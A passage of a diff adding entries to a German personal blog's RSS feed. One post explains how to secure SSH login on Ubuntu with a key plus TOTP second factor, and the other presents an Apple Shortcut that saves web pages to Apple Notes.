+    &lt;a href=&#34;#wie-man-sich-sicher-an-einem-ssh-server-anmeldet&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Wie man sich sicher an einem SSH-Server anmeldet
+&lt;/h2&gt;
+&lt;p&gt;Die sicherste Methode zur SSH-Authentifizierung kombiniert einen SSH-Schlüssel mit einem zeitbasierten Einmalcode (TOTP) als zweiten Faktor&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;. Diese Methode bietet eine hervorragende Balance zwischen Sicherheit und Benutzerfreundlichkeit und ist vergleichbar mit der MFA-Anmeldung bei vielen Online-Diensten.&lt;/p&gt;
+&lt;p&gt;Eine Alternative ist beispielsweise auch die Nutzung eines YubiKey&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;wie-richtet-man-nun-ssh-mit-zweitem-faktor-ein&#34;&gt;
+    &lt;a href=&#34;#wie-richtet-man-nun-ssh-mit-zweitem-faktor-ein&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Wie richtet man nun SSH mit zweitem Faktor ein?
+&lt;/h2&gt;
+&lt;p&gt;Die Einrichtung beschreibe ich im Folgenden auf einem Server, auf dem &lt;strong&gt;Ubuntu 24.04&lt;/strong&gt; läuft. Je nach Betriebssystem und genutzter SSH-Server-Version kann die Einrichtung sich unterscheiden. In meinem Fall wird die SSH-Version &lt;strong&gt;OpenSSH 9.6p1&lt;/strong&gt; genutzt. Des weiteren gehe ich davon aus, dass SSH bereits wie gewünscht eingerichtet und getestet ist und nur noch MFA eingerichtet werden muss.&lt;/p&gt;
+&lt;h3 id=&#34;der-zielzustand&#34;&gt;
+    &lt;a href=&#34;#der-zielzustand&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Der Zielzustand
+&lt;/h3&gt;
+&lt;p&gt;Im Folgenden eine kurze Zusammenfassung des Zielzustands:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Im Zielzustand soll eine Anmeldung mit Kennwort auf dem Server nicht möglich sein.&lt;/li&gt;
+&lt;li&gt;Die Authentifizierung erfolgt mithilfe eines SSH-Schlüssels mit einem zeitbasierten Einmalcode als zweitem Faktor.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Ich gehe davon aus, dass ihr euch bereits mithilfe eures SSH-Schlüssels auf dem Server anmelden könnt&lt;sup id=&#34;fnref:4&#34;&gt;&lt;a href=&#34;#fn:4&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;paketinstallation&#34;&gt;
+    &lt;a href=&#34;#paketinstallation&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Paketinstallation
+&lt;/h3&gt;
+&lt;p&gt;Für die weiteren Schritte muss das Paket &lt;code&gt;libpam-google-authenticator&lt;/code&gt; installiert werden. Dies geschieht durch Eingabe von&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt update
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install libpam-google-authenticator
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ins Terminal.&lt;/p&gt;
+&lt;h3 id=&#34;konfiguration-für-den-nutzer&#34;&gt;
+    &lt;a href=&#34;#konfiguration-f%c3%bcr-den-nutzer&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Konfiguration für den Nutzer
+&lt;/h3&gt;
+&lt;p&gt;Für jeden Nutzer, der Einmalcodes nutzen können soll, muss eine initiale Konfiguration durchgeführt werden. Diese wird gestartet, in dem sich der jeweilige Nutzer z. B. per SSH auf dem System einloggt und den Befehl&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;google-authenticator
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ausführt. Anschließend startet der Setup-Assistent. Meine Empfehlung lautet, die dort gestellten Fragen wie folgt zu beantworten:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Make tokens “time-based”: &lt;strong&gt;yes&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Update the .google_authenticator file: &lt;strong&gt;yes&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Disallow multiple uses: &lt;strong&gt;yes&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Increase the original generation time limit: &lt;strong&gt;no&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Enable rate-limiting: &lt;strong&gt;yes&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Der anschließend gezeigte QR-Code kann mit einer geeigneten Handy-App gescannt werden. Die Backup-Codes sollten sicher, beispielsweise auf einem Blatt Papier, aufbewahrt werden.&lt;/p&gt;
+&lt;h3 id=&#34;serverkonfiguration&#34;&gt;
+    &lt;a href=&#34;#serverkonfiguration&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Serverkonfiguration
+&lt;/h3&gt;
+&lt;p&gt;Nun kann mit der Konfiguration des Servers fortgefahren werden. Erstellt vor Änderung der genannten Dateien jeweils ein Backup, das ihr im Fehlerfall wiederherstellen könnt!&lt;/p&gt;
+&lt;h4 id=&#34;anpassung-von-etcpamdsshd&#34;&gt;
+    &lt;a href=&#34;#anpassung-von-etcpamdsshd&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Anpassung von /etc.pam.d/sshd
+&lt;/h4&gt;
+&lt;p&gt;Die Datei &lt;code&gt;/etc.pam.d/sshd&lt;/code&gt; wird mit einem Editor mit &lt;code&gt;root&lt;/code&gt;-Berechtigung geöffnet. Dort wird die Zeile &lt;code&gt;@include common-auth&lt;/code&gt; auskommentiert, in dem man ein &lt;code&gt;#&lt;/code&gt; an den Anfang der Zeile schreibt:&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/common-auth.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Das verhindert das Zurückfallen zu einer passwortbasierten Anmeldung.&lt;/p&gt;
+&lt;p&gt;An das Ende der Datei muss anschließend der Text &lt;code&gt;auth required pam_google_authenticator.so&lt;/code&gt; angefügt werden:&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/auth-required.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&#34;anpassung-von-etcsshsshd_config&#34;&gt;
+    &lt;a href=&#34;#anpassung-von-etcsshsshd_config&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Anpassung von /etc/ssh/sshd_config
+&lt;/h4&gt;
+&lt;p&gt;Anschließend muss die Datei &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; mit einem Editor mit &lt;code&gt;root&lt;/code&gt;-Berechtigung geöffnet werden. Dort muss die Zeile &lt;code&gt;AuthenticationMethods&lt;/code&gt; gefunden und der Wert auf &lt;code&gt;publickey,keyboard-interactive&lt;/code&gt; geändert werden. Ist diese nicht vorhanden, kann diese an das Ende der Datei angefügt werden:&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/auth-methods.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Außerdem muss die Option &lt;code&gt;KbdInteractiveAuthentication&lt;/code&gt; auf &lt;code&gt;yes&lt;/code&gt; geändert werden. Außerdem sollte bei dieser Gelegenheit überprüft werden, dass &lt;code&gt;PubkeyAuthentication&lt;/code&gt; auf &lt;code&gt;yes&lt;/code&gt; und &lt;code&gt;PasswordAuthentication&lt;/code&gt; auf &lt;code&gt;no&lt;/code&gt; steht:&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/kbd-interactive.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h4 id=&#34;konfiguration-testen&#34;&gt;
+    &lt;a href=&#34;#konfiguration-testen&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Konfiguration testen
+&lt;/h4&gt;
+&lt;p&gt;Sind alle oben genannten Schritte ausgeführt und alle Dateien gespeichert, muss die Konfiguration getestet werden. Haltet die bestehende SSH-Verbindung zum Server auf jeden Fall aufrecht, da ihr euch bei fehlerhafter Konfiguration eventuell nicht mehr in den Server einloggen könnt. Um die Konfiguration zu testen, stellt eine neue SSH-Verbindung her ohne die alte zu beenden!&lt;/p&gt;
+&lt;p&gt;Damit die getätigte Konfiguration aktiv werden kann, muss der SSH-Server neu geladen werden. Dies geschieht durch den folgenden Befehl:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo service ssh reload
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nun ist die neue Konfiguration aktiv und ihr werdet beim Login nach einem Einmal-Code gefragt, den eure Authenticator-App generiert.&lt;/p&gt;
+&lt;h2 id=&#34;fazit&#34;&gt;
+    &lt;a href=&#34;#fazit&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Fazit
+&lt;/h2&gt;
+&lt;p&gt;Durch die Kombination von SSH-Schlüsseln und einem zweiten Faktor wie TOTP wird die Sicherheit signifikant erhöht. Diese Einrichtung ist relativ einfach umzusetzen und bietet effektiven Schutz vor vielen Angriffen.&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.heise.de/tipps-tricks/Was-ist-SSH-7313396.html&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;„Was ist SSH?“ bei heise online&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.security-insider.de/was-ist-totp-a-875708/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;„Was ist TOTP?“ bei security-insider&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://developers.yubico.com/SSH/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;„Securing SSH with the YubiKey“ bei yubico&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:4&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.thomas-krenn.com/de/wiki/OpenSSH_Public_Key_Authentifizierung_unter_Ubuntu&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;„OpenSSH Public Key Authentifizierung unter Ubuntu“ bei Thomas-Krenn&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:4&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+
+    </description>
+    </item>
+    
+    <item>
+    <title>Apple Shortcut: Webseite in Apple Notizen speichern</title>
+    <link>https://xenophil90.github.io/posts/2025/ios-ipados-webseite-in-apple-notes/</link>
+    <pubDate>Sat, 04 Jan 2025 17:53:20 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2025/ios-ipados-webseite-in-apple-notes/</guid>
+    <description>
+        &lt;h2 id=&#34;apple-notizen-als-herstück-der-digitalen-organisation&#34;&gt;
+    &lt;a href=&#34;#apple-notizen-als-herst%c3%bcck-der-digitalen-organisation&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Apple Notizen als Herstück der digitalen Organisation
+&lt;/h2&gt;
+&lt;p&gt;Apple Notizen ist das Herzstück meiner digitalen Organisation. Hier sammle und strukturiere ich zahlreiche Informationen, auf die ich jederzeit und von all meinen Geräten aus zugreifen kann&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;kurzbefehl-um-webseiten-in-apple-notizen-zu-speichern&#34;&gt;
+    &lt;a href=&#34;#kurzbefehl-um-webseiten-in-apple-notizen-zu-speichern&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Kurzbefehl, um Webseiten in Apple Notizen zu speichern
+&lt;/h2&gt;
+&lt;p&gt;Besonders oft stoße ich im Netz auf spannende Inhalte: lesenswerte Artikel, inspirierende Blog-Beiträge oder praktische Rezepte. Um solche Funde schnell und effizient zu speichern, habe ich einen Kurzbefehl für mein iPhone und iPad erstellt, der mir die meiste Arbeit abnimmt.&lt;/p&gt;
+&lt;p&gt;Zwar läuft der Kurzbefehl nicht in jedem Fall absolut reibungslos, doch für meinen Bedarf ist er mehr als ausreichend – und ein echter Zeitgewinn.&lt;/p&gt;
+&lt;p&gt;Falls du ebenfalls Interesse daran hast, kannst du ihn selbst ausprobieren. Ich habe ihn per iCloud veröffentlicht&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;Hier siehst du eine Übersicht des Kurzbefehls (Screenshot erstellt auf macOS, der Kurzbefehl selbst funktioniert jedoch ausschließlich auf iOS und iPadOS).&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/SCR-20250104-pvcu.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Der Befehl extrahiert die wichtigsten Informationen der Webseite, darunter verschiedene Metadaten, ein Teaser-Bild und den vollständigen Text. Zusätzlich wird eine PDF-Version erstellt und direkt in der Notiz gespeichert.&lt;/p&gt;
+&lt;h2 id=&#34;weitere-verarbeitung&#34;&gt;
+    &lt;a href=&#34;#weitere-verarbeitung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Weitere Verarbeitung
+&lt;/h2&gt;
+&lt;p&gt;Sobald die Inhalte als Notiz gespeichert sind, lassen sie sich hervorragend weiterverarbeiten. Sie können verschlagwortet, kommentiert und mit anderen Notizen verknüpft werden. Auch eine Weiterbearbeitung in leistungsfähigeren Tools wie Obsidian&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt; ist problemlos möglich.&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;hhttps://www.myforevernotes.com&#34;&gt;Forever ✱ Notes eignet sich beispielsweise hervorragend dafür, ein zweites Gehirn auf Basis von Apple Notizen zu erstellen&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.icloud.com/shortcuts/320574d3dc7b49f7ac85404946603327&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;Link zum Shortcut zum selbst probieren&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
